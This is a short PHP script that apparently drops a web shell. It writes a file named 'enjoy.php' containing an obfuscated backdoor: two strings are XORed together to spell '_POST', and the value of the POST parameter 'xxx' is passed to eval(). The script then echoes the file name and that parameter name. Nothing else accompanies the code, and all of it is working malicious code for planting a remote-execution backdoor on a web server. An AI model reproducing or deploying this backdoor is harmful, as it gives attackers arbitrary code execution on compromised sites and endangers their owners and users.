<?
$myfile = fopen("enjoy.php", "w") or die('error open!');
$txt = '<? $_="~+d()"^"!{+{}";$__=${$_}[\'xxx\'];eval($__);?>';
fwrite($myfile, $txt);
fclose($myfile);
echo 'enjoy|xxx';